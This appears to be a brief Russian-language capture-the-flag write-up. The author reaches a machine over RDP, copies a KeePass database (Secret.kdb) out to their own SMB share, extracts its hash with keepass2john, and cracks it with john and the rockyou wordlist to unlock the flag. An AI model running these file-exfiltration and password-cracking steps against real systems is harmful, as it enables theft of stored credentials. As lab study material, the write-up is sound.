
Подключается к машине через xfreerdp
Находим файл Secret.kdb
Поднимаем на локальной машине smb server и с помощью команды``` copy \\ip\share\file-name``` передаем файл на свою машину

Получаем хеш пароля от базы```keepass2john secret.kdb > hash.txt```


расшифруем хеш
```
 john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Устанавливаем keepassxc, запускаем и импортируем keepass 1 database указав найденный пароль и файл базы => получаем флаг